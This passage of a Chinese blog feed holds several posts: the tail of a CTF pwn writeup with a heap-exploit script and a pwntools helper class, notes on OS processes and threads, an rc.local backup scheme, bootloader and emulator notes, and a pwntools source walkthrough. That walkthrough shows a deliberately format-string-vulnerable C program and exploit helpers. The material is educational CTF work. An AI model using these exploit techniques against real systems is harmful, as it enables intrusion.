class="line">get(1,4,&apos;\xff&apos;*(0x400-0x30)+p64(0)*4+p64(0x7f0000000001))</span><br><span class="line">sleep(1)</span><br><span class="line">io.sl(666)</span><br><span class="line">hack(&apos;a&apos;*0x80+p64(heap_address+0xe80-8)+p64(libc.address+leave_ret))</span><br><span class="line">io.it()</span><br></pre></td></tr></table></figure><p>pwnIO.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc_version = [&quot;2.19&quot;, &quot;2.23&quot;, &quot;2.24&quot;, &quot;2.28&quot;, &quot;2.29&quot;]</span><br><span class="line">linux_arch = &#123;&quot;i386&quot;, &quot;amd64&quot;&#125;</span><br><span class="line"></span><br><span class="line">class pwnIO():</span><br><span class="line">    def __init__(self, filename, ip, port, arch, libcv, libc_path=None):</span><br><span class="line">        self.binary_name = filename</span><br><span class="line">        self.ip = ip</span><br><span class="line">        self.port = port</span><br><span class="line">        self.io = None</span><br><span class="line">        self.token = &apos;&apos;</span><br><span class="line">        assert(arch in linux_arch)</span><br><span class="line">        self.arch = arch</span><br><span class="line">        self.is_debug = None</span><br><span class="line">        context.arch = arch</span><br><span class="line">        context.os = &apos;linux&apos;</span><br><span class="line">        assert(libcv in libc_version)</span><br><span class="line">        if self.arch == &apos;i386&apos;:</span><br><span class="line">            self.ld_path = &quot;/glibc/%s/32/lib/ld-%s.so&quot;  % (libcv, libcv)</span><br><span class="line">            self.libc_path = &quot;/glibc/%s/32/lib/libc.so.6&quot;  % (libcv)</span><br><span class="line">        elif self.arch == &apos;amd64&apos;:</span><br><span class="line">            self.ld_path = &quot;/glibc/%s/64/lib/ld-%s.so&quot;  % (libcv, libcv)</span><br><span class="line">            self.libc_path = &quot;/glibc/%s/64/lib/libc.so.6&quot;  % (libcv)</span><br><span class="line">        if libc_path is not None:</span><br><span class="line">            self.libc_path = libc_path</span><br><span class="line">    </span><br><span class="line">    def get_libc(self, libc_name=None, checksec=False):</span><br><span class="line">        if libc_name is None:</span><br><span class="line">            return ELF(self.libc_path, checksec=checksec)</span><br><span class="line">        else:</span><br><span class="line">            return ELF(libc_name, checksec=checksec)</span><br><span class="line"></span><br><span class="line">    def b(self, string=None):</span><br><span class="line">        raw_input(string)</span><br><span class="line"></span><br><span class="line">    def set_token(self, token):</span><br><span class="line">        self.token = token</span><br><span class="line">        log.info(&quot;token: %s&quot; %(token))</span><br><span class="line"></span><br><span class="line">    def send_token(self):</span><br><span class="line">        self.sl(self.token)</span><br><span class="line">        log.info(&quot;send token: %s&quot; %(token))</span><br><span class="line"></span><br><span class="line">    def close_io(self):</span><br><span class="line">        if self.is_debug:</span><br><span class="line">            self.io.kill()</span><br><span class="line">        else:</span><br><span class="line">            self.io.close()</span><br><span class="line">        self.is_debug = None</span><br><span class="line"></span><br><span class="line">    def debug(self, log_level=&apos;debug&apos;):</span><br><span class="line">        if self.io is not None:</span><br><span class="line">            self.close_io()</span><br><span class="line">        self.io = process([self.ld_path, self.binary_name], env=&#123;&quot;LD_PRELOAD&quot;:self.libc_path&#125;)</span><br><span class="line">        self.is_debug = True</span><br><span class="line">        context.log_level = log_level</span><br><span class="line">        context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">    def remote(self, log_level=&apos;info&apos;):</span><br><span class="line">        if self.io is not None:</span><br><span class="line">            self.close_io()</span><br><span class="line">        self.io = remote(self.ip, self.port)</span><br><span class="line">        self.is_debug = False</span><br><span class="line">        context.log_level = log_level</span><br><span class="line"></span><br><span class="line">    def s(self, data, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if timeout is None:</span><br><span class="line">            return self.io.send(str(data))</span><br><span class="line">        else:</span><br><span class="line">            return self.io.send(str(data), timeout)</span><br><span class="line"></span><br><span class="line">    def sl(self, data, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if timeout is None:</span><br><span class="line">            return self.io.sendline(str(data))</span><br><span class="line">        else:</span><br><span class="line">            return self.io.sendline(str(data), timeout)</span><br><span class="line">    </span><br><span class="line">    def sla(self, delim, data, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if timeout is None:</span><br><span class="line">            return self.io.sendlineafter(delim, str(data))</span><br><span class="line">        else:</span><br><span class="line">            return self.io.sendlineafter(delim, str(data), timeout)</span><br><span class="line">    </span><br><span class="line">    def r(self, numb=None, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if numb is None:</span><br><span class="line">            return self.io.recv()</span><br><span class="line">        elif timeout is None:</span><br><span class="line">            return self.io.recv(numb)</span><br><span class="line">        else:</span><br><span class="line">            return self.io.recv(numb, timeout)</span><br><span class="line"></span><br><span class="line">    def ru(self, delims, drop=True, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if timeout is None:</span><br><span class="line">            return self.io.recvuntil(delims, drop)</span><br><span class="line">        else:</span><br><span class="line">            return self.io.recvuntil(delims, drop, timeout)</span><br><span class="line">    </span><br><span class="line">    def ra(self, timeout=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        return self.io.recvall(timeout)</span><br><span class="line"></span><br><span class="line">    def it(self, prompt=None):</span><br><span class="line">        assert(self.io is not None)</span><br><span class="line">        if prompt is None:</span><br><span class="line">            return self.io.interactive()</span><br><span class="line">        else:</span><br><span class="line">            return self.io.interactive(prompt)</span><br><span class="line">    </span><br><span class="line">    def attach(self, gdbscript=None):</span><br><span class="line">        if not self.is_debug:</span><br><span class="line">            log.failure(&quot;remoting&quot;)</span><br><span class="line">            return None</span><br><span class="line">        if gdbscript is None:</span><br><span class="line">            return gdb.attach(self.io)</span><br><span class="line">        else:</span><br><span class="line">            return gdb.attach(self.io, gdbscript)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里总结一下，啥也没学到题目
    
    </summary>
    
    
    
      <category term="ctf,pwn,writeup" scheme="http://yoursite.com/tags/ctf-pwn-writeup/"/>
    
  </entry>
  
  <entry>
    <title>操作系统相关</title>
    <link href="http://yoursite.com/2020/01/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/"/>
    <id>http://yoursite.com/2020/01/26/操作系统相关/</id>
    <published>2020-01-26T06:18:36.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>进程为什么分那么多状态、为什么要分好多进程队列</p><p>其实我们作为用户不太能理解为啥，进程会分很多状态，在某一瞬间只有一个进程或者几个进程在执行，我进程有执行和停止两种状态，一个链表就行了，然而对于一个正在请求io的进程，io操作还没结束就不能继续下去，cpu处于空闲状态，对于这种进程，在调度的时候，没必要选择这种进程，因为浪费资源，所以，和这种进程类似的进程应该分为一类，赋予一个状态叫做堵塞态，还有一些进程由于操作系统内存不足，把进程的内存镜像换到外存种，显然系统调度的时候倾向于优先调度内存的中进程，所以这一类进程也应该分为一类，赋予一个状态叫做挂起态，挂起状态还得分挂起就绪状态和挂起堵塞状态，因为，有一种比较极端的情况，当内存内的进程全部处于堵塞状态，那么操作系统更倾向于去从外存中换入一个进程执行，而不是运行一个新建的进程来增加操作系统的负担，那么如果挂起状态都是堵塞状态，那么就没有必要去换入进程，所以，需要两种状态，所以，进程最少有5种状态</p><ul><li>运行态</li><li>就绪态</li><li>堵塞态</li><li>挂起堵塞态</li><li>挂起就绪态</li></ul><p>操作系统应该把cpu的使用权交给就绪态的进程，切换完进程上下文就能执行的，这样才不会浪费资源</p><p>那么为啥要多队列的呢，因为，操作系统的进程成千上万如果都弄成一个链表的话，调度的话，还好，但是，切换某一个进程的状态的时候，特别是堵塞态转变成就绪态，就要遍历整个链表，相当的浪费时间，应该把每一种状态弄个一个链表，甚至链表下面还要有子链表，特别是堵塞状态，最好每一个io设备一个链表，这样能够提高操作系统的调度速度</p></li><li><p>操作系统的的执行</p><p>其实我就一直在想在linux系统中，当我一个用户态程序调用一个系统调用的时候，这个进程被挂起，然后内核执行完之后，返回给用户态进程，那么内核运行的时候这个进程和用户态进程是不是同一个进程，那多个用户态进程进行系统调用的时候，是同一个进程响应，还是多个进程响应，其实，系统分三种</p><ul><li>无进程内核，就是所有的系统的调用都由内核（一个例程）响应</li><li>在用户态运行，就一个进程有两种状态，内核态和用户态，当进行系统调用的时候，进程转变状态，运行系统调用</li><li>基于进程操作系统，就是说每一种系统调用都有一个例程维护，当一个进程调用一个系统调用，相应的例程进行响应</li></ul><p>linux属于第二种</p></li><li><p>线程分类及优缺点</p><p>大概分为两种：</p><ul><li>第一种是用户级线程，这种线程创建、调度、销毁都在用户态执行，这样的优点在于内核不用额外的支持，就能支持多线程，缺点大概有两个，一个是如果一个多线程程序，其中一个线程，请求io堵塞之后，整个进程都会堵塞，而不是切换到另一个线程继续执行，这样的话，线程的优势不能完全发挥出来，切换线程的代价比切换进程要小的多，这样，也有解决方案，但是得内核添加额外支持，第二个缺点很致命，对于多核计算机，多线程程序，只能分配一个cpu，而不能多个线程并行执行</li><li>第二种是内核级线程，优点是可以多个线程并行执行，但是会有用户态到内核态切换的代价</li></ul><p>现在的操作系统大多是结合这两种</p></li></ul>]]></content>
    
    <summary type="html">
    
      这里总结一下操作系统的一些疑问以及思考
    
    </summary>
    
    
    
      <category term="system" scheme="http://yoursite.com/tags/system/"/>
    
  </entry>
  
  <entry>
    <title>如何设置linux定时任务</title>
    <link href="http://yoursite.com/2020/01/13/%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AElinux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
    <id>http://yoursite.com/2020/01/13/如何设置linux定时任务/</id>
    <published>2020-01-13T07:23:52.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>那么定时备份就要考虑crontab，但是，crontab适用于24小时开机的机器，如果关机，错过预订的时间，那么，预期任务将不会被执行（<del>这里我没去求证是否有解决方案，还请大佬联系我</del>），我们个人pc是不可能24小时开机的，所以得考虑其他的解决方案，我这里用的是开机启动脚本 <strong>rc.local</strong> ，这个脚本一般位于 <strong>/etc/rc.local</strong> ,linux每次开机的时候都会以root权限执行这个脚本</p><h1 id="0x01-解决思路"><a href="#0x01-解决思路" class="headerlink" title="0x01 解决思路"></a>0x01 解决思路</h1><h2 id="0x00-替代crontab"><a href="#0x00-替代crontab" class="headerlink" title="0x00 替代crontab"></a>0x00 替代crontab</h2><p>我的想法是先建立一个json，json文件里面存着上次更新的日期，然后，用rc.local运行一个python脚本(<del>至于为什么用python，可能是我太菜了，shell脚本不会写</del>),python脚本程序流程如下</p><ul><li>读取json文件获得日期</li><li>获得现在的日期得到时间差</li><li>比较时间差和更新间隔</li><li>如果时间差大于时间间隔，就执行shell命令，并且更新json文件</li></ul><h2 id="0x01-差异备份"><a href="#0x01-差异备份" class="headerlink" title="0x01 差异备份"></a>0x01 差异备份</h2><p>那么现在crontab的替代品找到了，因为每次备份都要完全备份的话，用的时间越长，备份时间越长，表现出来的的状况就是一直在闪目录，过了很长时间才能登录，所以最好差异备份，那么如何差异备份呢，我们可以用tar工具备份，有一个 <strong>-N</strong> 的参数加日期，只更新日期之后改变的文件，那么这个日期应该是我们上一次更新的日期，那么问题来了，我第一次备份怎么办呢，我第一次需要手动备份，第二次脚本才能帮你更新</p><p>具体参考<a href="http://www.codes51.com/article/detail_3826106.html" target="_blank" rel="noopener">http://www.codes51.com/article/detail_3826106.html</a></p><h1 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h1><ul><li><p>python 不支持datetime对象的json序列化</p><p>参考<a href="https://blog.csdn.net/linglongbayinhe/article/details/86564855" target="_blank" rel="noopener">https://blog.csdn.net/linglongbayinhe/article/details/86564855</a></p></li></ul><h1 id="0x03-思考"><a href="#0x03-思考" class="headerlink" title="0x03 思考"></a>0x03 思考</h1><h1 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h1><p>这个python脚本除了备份还能干嘛？给以下几点思路</p><ul><li>定时更新github仓库</li><li>定时更新blog</li></ul><h2 id="0x01-遇到的问题"><a href="#0x01-遇到的问题" class="headerlink" title="0x01 遇到的问题"></a>0x01 遇到的问题</h2><ul><li><p>git push的时候要输入用户名和密码，然而执行的时候就不能输入，所以得用公钥登录参考<a href="https://www.cnblogs.com/superGG1990/p/6844952.html" target="_blank" rel="noopener">https://www.cnblogs.com/superGG1990/p/6844952.html</a> 因为是以root权限执行的rc.local 但是，我们一般不用root的用户登录，所以还得转换一下用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su user -c &quot;command&quot;</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x04-最后附上的我的源码github仓库"><a href="#0x04-最后附上的我的源码github仓库" class="headerlink" title="0x04 最后附上的我的源码github仓库"></a>0x04 最后附上的我的源码github仓库</h1><p><a href="https://github.com/pwnht/update_time" target="_blank" rel="noopener">https://github.com/pwnht/update_time</a></p>]]></content>
    
    <summary type="html">
    
      此篇源于入坑arch linux，比较害怕回滚挂，所以考虑如果定时备份
    
    </summary>
    
    
    
      <category term="linux,tools" scheme="http://yoursite.com/tags/linux-tools/"/>
    
  </entry>
  
  <entry>
    <title>从实时模式到保护模式的探索</title>
    <link href="http://yoursite.com/2020/01/11/%E4%BB%8E%E5%AE%9E%E6%97%B6%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8E%A2%E7%B4%A2/"/>
    <id>http://yoursite.com/2020/01/11/从实时模式到保护模式的探索/</id>
    <published>2020-01-11T10:10:41.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我知道bios最后一步会载入硬盘的第一个扇区到固定的内存里，然后，jmp到这个内存地址执行，那么问题来了，在512k内存中，要载入内核镜像，怎么确定内核映像在硬盘的中的位置，接下来分析非官方版的linux内核0.00和linux内核0.11来分析一下，注释很详细</p><p>参考 (<a href="https://github.com/voidccc/linux0.00" target="_blank" rel="noopener">h3ttps://github.com/voidccc/linux0.00</a>)</p><h1 id="0x01-linux-0-00遇到的问题"><a href="#0x01-linux-0-00遇到的问题" class="headerlink" title="0x01 linux 0.00遇到的问题"></a>0x01 linux 0.00遇到的问题</h1><ul><li><p>pwndbg插件错误我没找到合适的8086gdb插件，打算自己写一个,算了算了，还是bochs香</p></li><li><p>bios 0x13中断，参考<a href="https://en.wikipedia.org/wiki/INT_13H" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/INT_13H</a></p></li><li><p>bios 管理磁盘的两种模式：</p><ul><li>CHS（ <a href="https://en.wikipedia.org/wiki/Cylinder-head-sector" target="_blank" rel="noopener">cylinder-head-sector</a> ）简单那来说就是 柱面-磁头-扇区寻址，已经过时了</li><li>LEA （ <a href="https://en.wikipedia.org/wiki/Logical_block_addressing" target="_blank" rel="noopener">logical block addressing</a>）就是比lchs更加抽象化了，不用面向设备结构，而是抽象为逻辑块</li></ul></li><li><p>因为我环境是linux x86-x64，而head.s是32位架构的，所以直接as编译的话，就会失败，幸运的是as有一个参数是–32 就可以编译成功了</p></li><li><p>如果用bochs的话得安装sdl，还得安装pkg-config </p></li><li><p>因为我是archlinux 所以没有vgabios所以得指定路径,配上自己的配置文件</p><ul><li><p>bochsrc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">display_library: sdl</span><br><span class="line">romimage: file=/usr/share/bochs/BIOS-bochs-latest</span><br><span class="line">vgaromimage: file=/usr/share/bochs/VGABIOS-lgpl-latest</span><br><span class="line">megs: 16</span><br><span class="line">floppya: 1_44=&quot;Image.img&quot;, status=inserted</span><br><span class="line">#ata0-master: type=disk, path=&quot;hdc.img&quot;, mode=flat, cylinders=520, heads=16, spt=63</span><br><span class="line">boot: a</span><br></pre></td></tr></table></figure></li><li><p>qemu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -sdl -smbios file=/usr/share/bochs/BIOS-bochs-latest -fda ./Image.img -L file=/usr/share/bochs/VGABIOS-lgpl-latest -boot a</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x02-思考"><a href="#0x02-思考" class="headerlink" title="0x02 思考"></a>0x02 思考</h1><h2 id="0x00-grub是怎么定位kernel镜像的位置？？"><a href="#0x00-grub是怎么定位kernel镜像的位置？？" class="headerlink" title="0x00 grub是怎么定位kernel镜像的位置？？"></a>0x00 grub是怎么定位kernel镜像的位置？？</h2><p>参考<a href="https://www.cnblogs.com/sky-heaven/p/5641021.html" target="_blank" rel="noopener">https://www.cnblogs.com/sky-heaven/p/5641021.html</a></p><p>大概就是第一扇区不够，所以，grub需要按一定的位置放在扇区上，然后grub用第一扇区的code去调用bios中断，把剩余的grub扇区再读到内存，之后，在读文件系统！！！！！定位image镜像</p><h1 id="待补文件系统相关"><a href="#待补文件系统相关" class="headerlink" title="待补文件系统相关"></a>待补文件系统相关</h1></li></ul>]]></content>
    
    <summary type="html">
    
      这在里补一下操作系统知识
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>&#39;pwntools源码分析&#39;</title>
    <link href="http://yoursite.com/2019/12/10/pwntools%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/12/10/pwntools源码分析/</id>
    <published>2019-12-10T04:30:36.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>不得不说pwntools的源码注释写的不错，每一个文件里面，每一个函数，都注释有相应的用途和例子，非常的友好</p><h1 id="0X01-process类"><a href="#0X01-process类" class="headerlink" title="0X01 process类"></a>0X01 process类</h1><p>这个类位于 <strong>pwntools/pwnlib/tubes/process.py</strong> 这个文件夹下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class process(tube):</span><br></pre></td></tr></table></figure><p>我们可以看到process这个类继承了tube类，tube类位于同一文件夹下 <strong>tube.py</strong> 里面，tube类里面就定义了好多常用的函数，比如send()、sendline()等函数，如果想要定制函数，在这个tube类里面写就行了</p><h1 id="0x02-fmtstr类"><a href="#0x02-fmtstr类" class="headerlink" title="0x02 fmtstr类"></a>0x02 fmtstr类</h1><p>这个类位于pwntools/pwnlib/fmtstr.py 里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Instantiates an object which try to automating exploit the vulnerable process</span><br><span class="line"></span><br><span class="line">    Arguments:</span><br><span class="line">        execute_fmt(function): function to call for communicate with the vulnerable process</span><br><span class="line">        offset(int): the first formatter&apos;s offset you control</span><br><span class="line">        padlen(int): size of the pad you want to add before the payload</span><br><span class="line">        numbwritten(int): number of already written bytes</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    self.execute_fmt = execute_fmt</span><br><span class="line">    self.offset = offset</span><br><span class="line">    self.padlen = padlen</span><br><span class="line">    self.numbwritten = numbwritten</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if self.offset == None:</span><br><span class="line">        self.offset, self.padlen = self.find_offset()</span><br><span class="line">        log.info(&quot;Found format string offset: %d&quot;, self.offset)</span><br><span class="line"></span><br><span class="line">    self.writes = &#123;&#125;</span><br><span class="line">    self.leaker = MemLeak(self._leaker)</span><br></pre></td></tr></table></figure><p>首先，看一下init函数有四个参数，</p><ul><li><p>第一个是execute_fmt函数指针，我们自己定义的，就是和程序交互的触发格式化字符串漏洞交互的函数，有点抽象2333</p></li><li><p>第二个参数 offset，就是你能控制第几个偏移量的内容，这个偏移量的数值为offset</p></li><li>第三个参数是padlen，在payload之前填充的长度</li><li>第四个参数是numbwrite，就是printf已经输出的字符的数量</li></ul><p>下面用例子来说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//gcc  -z noexecstack -fstack-protector-all -fpie -pie -z now stack_printf_format.c -o stack_printf_format</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void init()&#123;</span><br><span class="line">    setbuf(stdout,0);</span><br><span class="line">    setbuf(stdin,0);</span><br><span class="line">    setbuf(stderr,0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    char op[0x10];</span><br><span class="line">    char context[0x100];</span><br><span class="line">    memset(context,0,0x100);</span><br><span class="line">    memset(op,0,0x10);</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        puts(&quot;do you want input something&quot;);</span><br><span class="line">        fgets(op,0x10,stdin);</span><br><span class="line">        if(!strcmp(op,&quot;yes\n&quot;))&#123;</span><br><span class="line">            puts(&quot;ok,input something,I will call back for you&quot;);</span><br><span class="line">            fgets(context,0x100,stdin);</span><br><span class="line">            printf(context);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(context)</span><br></pre></td></tr></table></figure><p>这一行代码有格式化字符串漏洞，因为是一个循环，所以，我们应该定义一个函数完成一次循环交互，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def execute_fmt(payload):</span><br><span class="line">    p.sendlineafter(&apos;do you want input something\n&apos;,&apos;yes&apos;)</span><br><span class="line">    p.sendlineafter(&apos;ok,input something,I will call back for you\n&apos;,payload)</span><br><span class="line">    msg=p.recvuntil(&apos;\n&apos;)</span><br><span class="line">    print(&quot;msg=&quot;+msg)</span><br><span class="line">    print(&quot;payload=&quot;+payload)</span><br><span class="line">    return msg</span><br></pre></td></tr></table></figure><p>函数必须有返回值，返回值为格式化输出字符串的内容，两次printf为调试内容</p><p>然后如果没有设置offset和padlen，他就会自己通过find_offset()函数去找offset和padlen</p><p>然后看一个 <strong>find_offset()</strong> 这个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def find_offset(self):</span><br><span class="line">        marker = cyclic(20)</span><br><span class="line">        for off in range(1,1000):</span><br><span class="line">            leak = self.leak_stack(off, marker)</span><br><span class="line">            leak = pack(leak)</span><br><span class="line"></span><br><span class="line">            pad = cyclic_find(leak)</span><br><span class="line">            if pad &gt;= 0 and pad &lt; 20:</span><br><span class="line">                return off, pad</span><br><span class="line">        else:</span><br><span class="line">            log.error(&quot;Could not find offset to format string on stack&quot;)</span><br><span class="line">            return None, None</span><br></pre></td></tr></table></figure><p>首先生成长度为20的特定的字串作为marker</p><p>首先循环1000次，然后通过leak_stack得到某个偏移的内容，然后，用cyclic_find()函数找这个leak，如果找到且符合范围就return，没有的话就继续循环，直到循环结束，没有的话就return None</p><p>下面看一下leak_stack()函数</p><pre><code>def leak_stack(self, offset, prefix=b&quot;&quot;):    leak = self.execute_fmt(prefix + b&quot;START%%%d$pEND&quot; % offset)    try:        leak = re.findall(br&quot;START(.*)END&quot;, leak, re.MULTILINE | re.DOTALL)[0]        leak = int(leak, 16)    except ValueError:        leak = 0    return leak</code></pre><p>这个函数就是执行一遍execute_fmt()函数，得到输出正则匹配START和END中间的内容，也就是对应偏移的内容，转成16进制return</p><p>到此我们分析完了init()函数</p><p>那么如何向一个地址写呢，可以使用write()函数和execute_writes函数来实现</p><p>接下来是write()函数</p><pre><code>def write(self, addr, data):    self.writes[addr] = data</code></pre><p>向writes字典添加一个，没什么好说的</p><pre><code>def execute_writes(self):    fmtstr = randoms(self.padlen).encode()    fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen, write_size=&apos;byte&apos;)    self.execute_fmt(fmtstr)    self.writes = {}</code></pre><p>execute_writes()调用fmtstr_payload()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def fmtstr_payload(offset, writes, numbwritten=0, write_size=&apos;byte&apos;, write_size_max=&apos;long&apos;, overflows=16, strategy=&quot;small&quot;, badbytes=frozenset(), offset_bytes=0):</span><br><span class="line">    sz = 